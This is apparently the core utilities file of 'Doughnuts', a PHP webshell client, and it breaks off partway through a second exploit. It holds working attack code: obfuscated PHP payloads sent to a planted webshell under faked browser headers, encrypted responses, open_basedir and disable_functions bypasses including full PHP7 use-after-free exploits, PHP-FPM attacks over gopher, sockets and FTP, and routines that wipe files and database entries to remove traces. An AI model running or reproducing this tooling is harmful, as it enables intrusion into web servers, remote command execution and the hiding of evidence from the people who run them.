from os import path, makedirs
from threading import Thread
from time import sleep
from re import match, sub
from base64 import b64decode, b64encode
from binascii import b2a_hex
from locale import getpreferredencoding
from platform import system
from pprint import pprint
from random import choice, randint, sample
from string import ascii_letters, digits
from subprocess import Popen, check_output
from types import MethodType
from urllib.parse import quote, unquote_plus, urlparse, urlunparse
from hashlib import md5
from uuid import uuid4
from codecs import getencoder
import zlib

import requests
from requests.adapters import HTTPAdapter
from prettytable import PrettyTable
from requests.models import complexjson
from requests.utils import guess_json_utf
from urllib3 import disable_warnings

from libs.config import color, gget, gset
from auxiliary.fpm.fpm import generate_ssrf_payload, generate_ssrf_code_payload,  generate_base64_socks_payload, generate_base64_socks_code_payload, generate_extension

LEVEL = []
CONNECT_PIPE_MAP = {True: "│  ", False: "   "}
SYSTEM_TEMPLATE = None
Session = requests.Session()
LOCAL_ENCODING = getpreferredencoding()
ALPATHNUMERIC = ascii_letters + digits
RAND_KEY = str(uuid4())
UNITS = {"B": 1, "KB": 2**10, "MB": 2**20, "GB": 2**30, "TB": 2**40}
Session.mount('http://', HTTPAdapter(max_retries=2))
Session.mount('https://', HTTPAdapter(max_retries=2))


__version__ = "4.18.2"


disable_warnings()


def banner():
    logo_choose = randint(1, 3)
    if logo_choose == 1:
        print(
            r"""
  _____                    _                 _
 |  __ \                  | |               | |
 | |  | | ___  _   _  __ _| |__  _ __  _   _| |_ ___
 | |  | |/ _ \| | | |/ _` | '_ \| '_ \| | | | __/ __|
 | |__| | (_) | |_| | (_| | | | | | | | |_| | |_\__ \
 |_____/ \___/ \__,_|\__, |_| |_|_| |_|\__,_|\__|___/
                      __/ |
                     |___/

 """
        )
    if logo_choose == 2:
        print(
            r"""
    ____                    __                __
   / __ \____  __  ______ _/ /_  ____  __  __/ /______
  / / / / __ \/ / / / __ `/ __ \/ __ \/ / / / __/ ___/
 / /_/ / /_/ / /_/ / /_/ / / / / / / / /_/ / /_(__  )
/_____/\____/\__,_/\__, /_/ /_/_/ /_/\__,_/\__/____/
                  /____/

"""
        )
    if logo_choose == 3:
        print(
            r"""

 ________  ________  ___  ___  ________  ___  ___  ________   ___  ___  _________  ________
|\   ___ \|\   __  \|\  \|\  \|\   ____\|\  \|\  \|\   ___  \|\  \|\  \|\___   ___\\   ____\
\ \  \_|\ \ \  \|\  \ \  \\\  \ \  \___|\ \  \\\  \ \  \\ \  \ \  \\\  \|___ \  \_\ \  \___|_
 \ \  \ \\ \ \  \\\  \ \  \\\  \ \  \  __\ \   __  \ \  \\ \  \ \  \\\  \   \ \  \ \ \_____  \
  \ \  \_\\ \ \  \\\  \ \  \\\  \ \  \|\  \ \  \ \  \ \  \\ \  \ \  \\\  \   \ \  \ \|____|\  \
   \ \_______\ \_______\ \_______\ \_______\ \__\ \__\ \__\\ \__\ \_______\   \ \__\  ____\_\  \
    \|_______|\|_______|\|_______|\|_______|\|__|\|__|\|__| \|__|\|_______|    \|__| |\_________\
                                                                                     \|_________|

"""
        )
    print(color.green("Doughnut Version: %s\n" % __version__))


def base64_encode(data: str, encoding="utf-8"):
    return b64encode(data.encode(encoding=encoding)).decode()


def base64_decode(data: str, encoding="utf-8"):
    return b64decode(data.encode()).decode(encoding=encoding)


def hex_encode(data: str):
    return b2a_hex(data.encode()).decode()


def md5_file(file_path: str):
    md5_hash = None
    if path.isfile(file_path):
        f = open(file_path, 'rb')
        md5_obj = md5()
        md5_obj.update(f.read())
        hash_code = md5_obj.hexdigest()
        f.close()
        md5_hash = str(hash_code).lower()
    return md5_hash


def md5_encode(data: bytes):
    md5_hash = None
    md5_obj = md5()
    md5_obj.update(data)
    hash_code = md5_obj.hexdigest()
    md5_hash = str(hash_code).lower()
    return md5_hash


def gzinflate(compressed: bytes) -> bytes:
    return zlib.decompress(compressed, -zlib.MAX_WBITS) if compressed else b''


def gzdeflate(data: bytes) -> bytes:
    compressor = zlib.compressobj(9, zlib.DEFLATED, -zlib.MAX_WBITS)
    compressed = compressor.compress(data)
    compressed += compressor.flush()
    return compressed


def size_to_human(num, suffix='B'):
    for unit in ['', 'K', 'M', 'G', 'T', 'P', 'E', 'Z']:
        if abs(num) < 1024.0:
            return "%3.1f %s%s" % (num, unit, suffix)
        num /= 1024.0
    return "%.1f%s%s" % (num, 'Yi', suffix)


def human_to_size(size):
    size = size.upper()
    if not match(r' ', size):
        size = sub(r'([KMGT]?B)', r' \1', size)
    number, unit = [string.strip() for string in size.split()]
    return int(float(number)*UNITS[unit])


def clean_trace():
    def get_clean_php(filename: str):
        system_clean_command = f"rm -f {filename} && echo success"
        return """$f=base64_decode("%s");
    if (!unlink($f)){
        %s
    }else{echo "success";}
    """ % (base64_encode(filename), get_system_code(system_clean_command))
    ld_preload_filename = gget("webshell.ld_preload_path", "webshell", None)
    udf_filename = gget("webshell.udf_path", "webshell", None)
    iconv_filename = gget("webshell.iconv_path", "webshell", None)
    iconv_gconv_modules_filename = gget(
        "webshell.iconv_gconv_modules_path", "webshell", None)
    clean_files = (ld_preload_filename, udf_filename,
                   iconv_filename, iconv_gconv_modules_filename)

    for each in clean_files:
        if (each):
            print(color.yellow("\nClean %s ...\n" % each))
            res = send(get_clean_php(each))
            if (res):
                text = res.r_text.strip()
                if ("success" in text):
                    print(color.green("Clean success\n"))
                else:
                    print(color.red("Clean failed\n"))
    if (udf_filename):
        print(color.yellow("\nClean udf ...\n"))
        execute_sql_command("delete from mysql.func where name='sys_eval';")

    gset("webshell.ld_preload_path", None, True, "webshell")
    gset("webshell.ld_preload_func", None, True, "webshell")
    gset("webshell.iconv_path", None, True, "webshell")
    gset("webshell.iconv_gconv_modules_path", None, True, "webshell")
    gset("webshell.udf_path", None, True, "webshell")
    gset("webshell.apache_mod_cgi", False, True, "webshell")
    gset("db_dbms", '', True, "webshell")
    gset("db_ext", '', True, "webshell")
    gset("db_connect_type", '', True, "webshell")
    gset("db_connected", False, True, "webshell")
    gset("db_host", '', True, "webshell")
    gset("db_username", '', True, "webshell")
    gset("db_password", '', True, "webshell")
    gset("db_dbname", '', True, "webshell")
    gset("db_port", 0, True, "webshell")


def r_json(self, **kwargs):
    if not self.encoding and self.r_content and len(self.r_content) > 3:
        encoding = guess_json_utf(self.r_content)
        if encoding is not None:
            try:
                return complexjson.loads(
                    self.r_content.decode(encoding), **kwargs
                )
            except UnicodeDecodeError:
                pass
    return complexjson.loads(self.r_text, **kwargs)


def randstr(string="", offset=8):
    return ''.join(sample(string, offset))


def trush(min_num=2, max_num=4):
    return randstr(ALPATHNUMERIC, randint(min_num, max_num))


def newfile(file_name):
    file_path = gget("webshell.download_path", "webshell")
    if not path.exists(file_path):
        makedirs(file_path)
    real_file_path = path.join(file_path, file_name).replace("\\", "/")
    with open(real_file_path, "w+"):
        ...
    return real_file_path


def fake_ua():
    user_agents = gget("user_agents", default=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",))
    return choice(user_agents).strip()


def fake_referer():
    i = randint(1, 6)
    random_params = ""
    for _ in range(randint(4, 8)):
        random_params += f"{trush()}={trush()}&"
    random_params = random_params.strip("&")
    if (i == 1):
        return f"https://www.google.{trush(2,2)}/url?{random_params}"
    elif (i == 2):
        return f"https://blog.csdn.net/{trush(5, 12)}/article/details/{randint(10000, 99999)}?{random_params}"
    elif (i == 3):
        return f"https://www.baidu.com/?q={trush(2,10)}&{random_params}"
    elif (i == 4):
        return f"https://www.google.com/?q={trush(2,10)}&{random_params}"
    elif (i == 5):
        return f"https://juejin.im/post/{randstr(ALPATHNUMERIC, 24)}?{random_params}"
    elif (i == 6):
        return f"https://juejin.im/post/{randstr(ALPATHNUMERIC, 24)}?{random_params}"


def update_prompt():
    verbose = gget("PROMPT.VERBOSE")
    prompt = f"doughnuts ({color.cyan(gget('webshell.netloc', 'webshell'))}) > "
    if verbose:
        prompt = f"{color.yellow(gget('webshell.pwd', 'webshell'))}    {color.green('PHP ' + gget('webshell.php_version', 'webshell'))}\n" + prompt
    gset("webshell.prompt", prompt)


def get_db_connect_code(host="", username="", password="", dbname="", port=""):
    host = host if host else gget("db_host", "webshell", "")
    username = username if username else gget("db_username", "webshell", "")
    password = password if password else gget("db_password", "webshell", "")
    dbname = dbname if dbname else gget("db_dbname", "webshell", "")
    port = port if port else gget("db_port", "webshell", "")
    connect_type = gget("db_connect_type", "webshell")
    dbms = gget("db_ext", "webshell")
    if (connect_type == "pdo"):
        extra_port = f"port={port};" if port else ""
        extra_dbname = f"dbname={dbname};" if dbname else ""
        return f'$dsn="{dbms}:host={host};{extra_port}{extra_dbname}";$con= new PDO($dsn,"{username}","{password}");'
    elif (connect_type == "mysqli"):
        connect_code = '$con=mysqli_connect(%s);'
        temp_code = ",".join([f'"{y}"' for y in filter(
            lambda x: x, (host, username, password, dbname, port))])
        return connect_code % temp_code
    return ""


def get_ini_value_code():
    return """function get_ini_value($key){
    if(function_exists('ini_get')){
        return ini_get($key);    
    } else if(function_exists('ini_get_all')) {
        $gev = version_compare(PHP_VERSION,'5.3.0','ge');
        if($gev){
            $values = ini_get_all(null,false);
        } else {
            $values = ini_get_all();
        }
        if(array_key_exists($key, $values)){
            return $gev?$values[$key]:$values[$key]['local_value'];
        } else {
            return '';
        }
    } else if(function_exists('get_cfg_var')) {
        return get_cfg_var($key);
    } else{
        return '';
    }
}
"""


def get_sql_command_php(command, database, ruid, luid):
    connect_type = gget("db_connect_type", "webshell")
    connect_code = get_db_connect_code(dbname=database)
    command = base64_encode(command)
    if (connect_type == "pdo"):
        return """try{%s
$r=$con->query(base64_decode('%s'));
$rows=$r->fetchAll(PDO::FETCH_ASSOC);
foreach($rows[0] as $k=>$v){
    echo "$k"."%s";
}
echo "%s";
foreach($rows as $array){foreach($array as $k=>$v){echo "$v"."%s";};echo "%s";}
} catch (PDOException $e){
die("Connect error: ". $e->getMessage());
}""" % (connect_code, command, luid, ruid, luid, ruid)
    elif (connect_type == "mysqli"):
        return """%s
$r=$con->query(base64_decode('%s'));
$rows=$r->fetch_all(MYSQLI_ASSOC);
foreach($rows[0] as $k=>$v){
    echo "$k"."%s";
}
echo "%s";
foreach($rows as $array){foreach($array as $k=>$v){echo "$v"."%s";};echo "%s";}""" % (connect_code, command, luid, ruid, luid, ruid)
    else:
        return ""


def execute_sql_command(command, database: str = "", raw: bool = False):
    database = database if (database) else gget("db_dbname", "webshell")
    ruid = str(uuid4())
    luid = str(uuid4())
    res = send(get_sql_command_php(command, database, ruid, luid))
    if (not res):
        return ''
    rows = res.r_text.strip().split(ruid)
    if (raw):
        return [row.split(luid)[:-1] for row in rows[:-1]]
    elif (len(rows) > 1):
        info = rows[0].split(luid)[:-1]
        form = PrettyTable(info)
        for row in rows[1:-1]:
            row_data = row.split(luid)[:-1]
            if (row_data):
                form.add_row(row_data)
        return form
    return ''


def decode_g(result, key: str, options: bool):
    try:
        s = result.decode()
    except AttributeError:
        s = result

    s = unquote_plus(s, 'latin1')
    rlen = len(s)
    klen = len(key)
    keys = [key]

    for c in range(1, klen):
        for k in range(klen):
            key = key[:k] + chr((ord(key[(k + 1) % klen]) ^
                                 ord(key[k]))) + key[k + 1:]
        keys.append(key)

    for ct in range(klen - 1, -1, -1):
        kr = keys[ct][::-1]
        for i in range(rlen):
            s = s[:i] + chr(
                int(bin(ord(s[i]) ^ ord(kr[i % klen]))[2:].zfill(8)[::-1], 2) ^ ord(keys[ct][i % klen])) + s[i + 1:]

    de = getencoder("rot-13")(s)[0][::-1].encode("latin1")

    try:
        if (options):
            return de
        else:
            return de.decode("utf8")

    except UnicodeDecodeError:
        return b"" if options else ""


def _bypass_open_base_dir():
    return """$dir=pos(glob("./*", GLOB_ONLYDIR));
$cwd=getcwd();
$ndir="./%s";
if($dir === false){
$r=mkdir($ndir);
if($r === true){$dir=$ndir;}}
chdir($dir);
if(function_exists("ini_set")){
    ini_set("open_basedir","..");
} else {
    ini_alter("open_basedir","..");
}
$c=substr_count(getcwd(), "/");
for($i=0;$i<$c;$i++) chdir("..");
ini_set("open_basedir", "/");
chdir($cwd);rmdir($ndir);""" % (uuid4())


def _encode_response(encode_recv):
    encode_head = "ob_start();" if encode_recv else ""
    encode_tail = """$ooDoo=ob_get_clean();
$encode = mb_detect_encoding($ooDoo, array('ASCII','UTF-8',"GB2312","GBK",'BIG5','ISO-8859-1','latin1'));
$ooDoo = mb_convert_encoding($ooDoo, 'UTF-8', $encode);
function encode_g($result,$key){$easy_en = strrev(str_rot13($result));$rlen = strlen($result);$klen = strlen($key);$s = str_repeat("\x00",$rlen);for($c=0;$c<$klen;$c++){$kr = strrev($key);for($i=0;$i<$rlen;$i++){$s[$i] = chr(base_convert(strrev(str_pad(base_convert(ord($easy_en[$i])^ord($key[$i%$klen]),10,2),8,"0",STR_PAD_LEFT)),2,10)^ord($kr[$i%$klen]));}$easy_en = $s;if($c == $klen - 1){break;}for($k=0;$k<$klen;$k++){$key[$k] = chr((ord($key[($k + 1)%$klen])^ord($key[$k])));}}return $s;}
print(urlencode(encode_g($ooDoo, """ + '"' + RAND_KEY + '"' + """)));""" if encode_recv else ""
    return encode_head, encode_tail


def _fpm_eval_phpcode(url, phpcode, raw_key, password, params_dict):
    attack_type = gget("webshell.bdf_fpm.type", "webshell")
    host = gget("webshell.bdf_fpm.host", "webshell")
    port = gget("webshell.bdf_fpm.port", "webshell")
    sock_path = gget("webshell.bdf_fpm.sock_path", "webshell")

    if attack_type == "gopher":
        phpcode = """
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "%s");
curl_setopt($ch, CURLOPT_HEADER, 0);
$o = curl_exec($ch);
curl_close($ch);
$o = end(explode('\\n\\n', str_replace('\\r', '', $o), 2));
echo trim($o);
""" % (generate_ssrf_code_payload(host, port, phpcode))
    elif attack_type == "sock":
        phpcode = """
$sock_path='%s';
if(function_exists('stream_socket_client') && file_exists($sock_path)){
$sock=stream_socket_client("unix://".$sock_path);
} else {
die('stream_socket_client function not exist or sock not exist');
}
fwrite($sock, base64_decode('%s'));
$o = '';
while (!feof($sock)) {
  $o .= fread($sock, 8192);
}
$o = end(explode('\\n\\n', str_replace('\\r', '', $o), 2));
echo trim($o);
""" % (sock_path, generate_base64_socks_code_payload(host, port, phpcode))
    elif attack_type == "http_sock":
        phpcode = """
$host='%s';
$port=%s;
if(function_exists('fsockopen')){
$sock=fsockopen($host, $port, $errno, $errstr, 1);
} else if(function_exists('pfsockopen')){
$sock=pfsockopen($host, $port, $errno, $errstr, 1);
} else if(function_exists('stream_socket_client')) {
$sock=stream_socket_client("tcp://$sock_path:$port",$errno, $errstr, 1);
} else {
die('fsockopen/pfsockopen/stream_socket_client function not exist');
}
fwrite($sock, base64_decode('%s'));
$o = '';
while (!feof($sock)) {
  $o .= fread($sock, 8192);
}
$o = end(explode('\\n\\n', str_replace('\\r', '', $o), 2));
echo trim($o);
""" % (host, port, generate_base64_socks_code_payload(host, port, phpcode))
    elif attack_type == "ftp":
        php_server_port = gget(
            "webshell.bdf_fpm.php_server_port", "webshell", False)

        random_ftp_port = randint(60000, 64000)
        if not php_server_port:
            random_php_server_port = random_ftp_port + randint(1, 1000)
            php_server_phpcode = get_system_code(
                "php -n -t /tmp -S 0.0.0.0:%s" % random_php_server_port, False)
            params_dict[raw_key][password] = php_server_phpcode

            t = Thread(target=send, kwargs={
                "phpcode": php_server_phpcode, "_in_system_command": True})
            t.setDaemon(True)
            t.start()

            gset("webshell.bdf_fpm.php_server_port",
                 random_php_server_port, True, "webshell")
            php_server_port = random_php_server_port

        ftp_server_phpcode = """if(function_exists('stream_socket_server') && function_exists('stream_socket_accept')){
$ftp_table = [
    "USER" => "331 Username ok, send password.\\r\\n",
    "PASS" => "230 Login successful.\\r\\n",
    "TYPE" => "200 Type set to: Binary.\\r\\n",
    "SIZE" => "550 /test is not retrievable.\\r\\n",
    "EPSV" => "500 'EPSV': command not understood.\\r\\n",
    "PASV" => "227 Entering passive mode (%s,0,%s).\\r\\n",
    "STOR" => "150 File status okay. About to open data connection.\\r\\n",
];
$server = stream_socket_server("tcp://0.0.0.0:%s", $errno, $errstr);
$accept = stream_socket_accept($server);
fwrite($accept, "200 OK\\r\\n");
while (true) {
    $data = fgets($accept);
    $cmd = substr($data, 0, 4);
    if (array_key_exists($cmd, $ftp_table)) {
        fwrite($accept, $ftp_table[$cmd]);
        if ($cmd === "STOR") {
            break;
        }
    } else {
        break;
    }
}
fclose($server);
} else {
die('stream_socket_server/stream_socket_accept function not exist');
}""" % (host.replace(".", ","), port, random_ftp_port)

        t = Thread(target=send, kwargs={
            "phpcode": ftp_server_phpcode, "_in_system_command": True})
        t.setDaemon(True)
        t.start()
        sleep(0.2)

        temp_filename = uuid4()

        phpcode = """function ob_end_clean(){}
ob_start();
%s
$o=ob_get_clean();
$o = end(explode('\\n\\n', str_replace('\\r', '', $o), 2));
file_put_contents('/tmp/%s',$o);""" % (phpcode, temp_filename)

        phpcode = "file_put_contents('ftp://%s:%s/a', base64_decode('%s'));sleep(0.8);$fn='%s';print(file_get_contents('http://127.0.0.1:%s/'.$fn));unlink('/tmp/'.$fn);" % (
            host, random_ftp_port, generate_base64_socks_code_payload(host, port, phpcode), temp_filename, php_server_port)


    params_dict[raw_key][password] = phpcode
    res = Session.post(url, verify=False, **params_dict)

    return res


def send(phpcode: str, raw: bool = False, **extra_params):
    # extra_params['quiet'] 不显示错误信息
    offset = 8
    is_encode_recv = gget("encode_recv", default=False)
    is_fpm_eval_code = gget("webshell.bdf_fpm.use_in_eval", "webshell", False)
    in_system_command = gget("webshell.in_system_command", "webshell", False)
    if in_system_command:
        gset("webshell.in_system_command", False, True, "webshell")

    quiet = False
    if ("quiet" in extra_params):
        del extra_params["quiet"]
        quiet = True

    if ("_in_system_command" in extra_params):
        del extra_params["_in_system_command"]
        in_system_command = True

    proxies = gget("proxies")
    url = gget("webshell.url", "webshell")
    params_dict = gget("webshell.params_dict", "webshell").copy()
    php_v7 = gget("webshell.v7", "webshell")
    password = gget("webshell.password", "webshell")
    raw_key = gget("webshell.method", "webshell")
    encode_functions = gget("webshell.encode_functions", "webshell")
    encode_pf = gget("encode.pf")
    params_dict.update(extra_params)

    if "data" not in params_dict:
        params_dict["data"] = {}
    head = randstr("!@#$%^&*()[];,.?", offset)
    tail = randstr("!@#$%^&*()[];,.?", offset)

    pwd_b64 = b64encode(
        gget("webshell.pwd", "webshell", "Lg==").encode()).decode()
    raw_data = phpcode

    if not raw:
        encode_head, encode_tail = _encode_response(is_encode_recv)

        phpcode = f"""error_reporting(0);ob_end_clean();print("{head}");{encode_head}chdir(base64_decode("{pwd_b64}"));""" + phpcode

        if (gget("webshell.bypass_obd", "webshell")):
            phpcode = _bypass_open_base_dir() + phpcode

        phpcode += f"""{encode_tail}print("{tail}");"""

        if (php_v7):
            phpcode = f"""eval(base64_decode("{base64_encode(phpcode)}"));"""
        else:
            phpcode = f"""assert(eval(base64_decode("{base64_encode(phpcode)}")));"""

    for func in encode_functions:
        if func in encode_pf:
            phpcode = encode_pf[func].run(phpcode)
        elif ("doughnuts" in str(func)):
            _, salt = func.split("-")
            phpcode = encode_pf["doughnuts"].run(phpcode, salt)

    if (raw_key == "cookies"):
        phpcode = quote(phpcode)
    params_dict['headers']['User-agent'] = fake_ua()
    params_dict['headers']['Referer'] = fake_referer()
    params_dict[raw_key][password] = phpcode
    params_dict['proxies'] = proxies

    try:
        if is_fpm_eval_code and not in_system_command:
            res = _fpm_eval_phpcode(
                url, phpcode, raw_key, password, params_dict)
        else:
            res = Session.post(url, verify=False, **params_dict)
    except requests.RequestException as e:
        if (not quiet):
            print(color.red(f"\nRequest Error: {e}\n"))
        return

    if (res.apparent_encoding):
        res.encoding = encoding = res.apparent_encoding
    else:
        encoding = "utf-8"

    text = res.text
    content = res.content
    text_head_offset = text.find(head)
    text_tail_offset = text.find(tail)
    text_head_offset = text_head_offset + \
        offset if (text_head_offset != -1) else 0
    text_tail_offset = text_tail_offset if (
        text_tail_offset != -1) else len(text)
    con_head_offset = content.find(head.encode(encoding))
    con_tail_offset = content.find(tail.encode(encoding))
    con_head_offset = con_head_offset + \
        offset if (con_head_offset != -1) else 0
    con_tail_offset = con_tail_offset if (
        con_tail_offset != -1) else len(content)

    res.r_text = text[text_head_offset: text_tail_offset]
    res.r_content = content[con_head_offset: con_tail_offset]

    if (not raw and is_encode_recv):
        res.r_text = decode_g(res.r_text, RAND_KEY, False)
        res.r_content = decode_g(res.r_content, RAND_KEY, True)

    res.r_json = MethodType(r_json, res)

    if gget("DEBUG.SEND"):  # DEBUG
        print(color.yellow("-----DEBUG START------"))
        print(f"[{res.status_code}] {url} length: {len(res.r_text)} time: {res.elapsed.total_seconds()}", end="")
        print(f"raw: {color.green('True')}" if raw else '')
        for k, v in params_dict.items():
            print(f"{k}: ", end="")
            pprint(v)
        print("raw payload:\n" + raw_data)
        if (res.text):
            print(color.green("----DEBUG RESPONSE----"))
            print(res.r_text)
        else:
            print(color.green("----DEBUG RAW RESPONSE----"))
            print(res.text)
        print(color.yellow("------DEBUG END-------\n"))

    return res


def delay_send(time: float, phpcode: str, raw: bool = False, **extra_params):
    sleep(time)
    send(phpcode, raw, **extra_params)


def print_webshell_info():
    info = (
        gget("webshell.root", "webshell"),
        gget("webshell.os_version", "webshell"),
        gget("webshell.php_version", "webshell"),
        gget("webshell.server_version", "webshell"),
        gget("webshell.obd", "webshell", "None")
    )
    info_name = ("Web root:", "OS version:", "PHP version:",
                 "Server version:", "Open_basedir:")
    for name, info in zip(info_name, info):
        print(name + "\n    " + info + "\n")


def prepare_system_template(exec_func: str):
    global SYSTEM_TEMPLATE
    if (not exec_func):
        SYSTEM_TEMPLATE = ''
    elif (exec_func == 'system'):
        SYSTEM_TEMPLATE = """ob_start();system(base64_decode("%s"));$o=ob_get_contents();ob_end_clean();"""
    elif (exec_func == 'exec'):
        SYSTEM_TEMPLATE = """$o=array();exec(base64_decode("%s"), $o);$o=join(chr(10),$o);"""
    elif (exec_func == 'passthru'):
        SYSTEM_TEMPLATE = """$o=array();passthru(base64_decode("%s"), $o);$o=join(chr(10),$o);"""
    elif (exec_func == 'proc_open'):
        SYSTEM_TEMPLATE = """$handle=proc_open(base64_decode("%s"),array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);$o=NULL;while(!feof($pipes[1])){$o.=fread($pipes[1],1024);}@proc_close($handle);"""
    elif (exec_func == 'shell_exec'):
        SYSTEM_TEMPLATE = """$o=shell_exec(base64_decode("%s"));"""
    elif (exec_func == 'popen'):
        SYSTEM_TEMPLATE = """$fp=popen(base64_decode("%s"),'r');$o=NULL;if(is_resource($fp)){while(!feof($fp)){$o.=fread($fp,1024);}}@pclose($fp);"""
    elif (exec_func == 'pcntl_exec'):
        filename = uuid4()
        SYSTEM_TEMPLATE = """$r='/tmp/%s';if(pcntl_fork() === 0) {$cmd = base64_decode("%s");$args = array("-c","$cmd 2>&1 1>$r");pcntl_exec("/bin/bash", $args);exit(0);}pcntl_wait($status);$o=file_get_contents('/tmp/%s');unlink('/tmp/%s');""" % (
            filename, "%s", filename, filename)


def get_system_code(command: str, print_result: bool = True, mode: int = 0):
    bdf_mode = gget("webshell.bypass_df", "webshell") if mode == 0 else mode
    print_command = "print($o);" if print_result else ""
    gset("webshell.in_system_command", True, True, "webshell")

    if (bdf_mode == 1):  # php7-backtrace
        return """$o=pwn(base64_decode("%s"));
function pwn($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() {
            global $backtrace;
            unset($this->a);
            if (class_exists('Exception')) {
            $backtrace = (new Exception)->getTrace();
                if(!isset($backtrace[1]['args'])) {
                    $backtrace = debug_backtrace();
                }
            } else {
            $backtrace = (new Error)->getTrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %%= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle(str_repeat('A', 79));
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle(str_repeat('A', 79));

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("bdf error: Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("bdf error: Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("bdf error: Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("bdf error: Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
    ob_start();
    ($helper->b)($cmd);
    $o=ob_get_contents();
    ob_end_clean();
    %s
    return $o;
}""" % (base64_encode(command), print_command)
    elif (bdf_mode == 2):  # php7-gc
        return """$o=pwn(base64_decode("%s"));

function pwn($cmd) {
    global $abc, $helper;

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %%= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
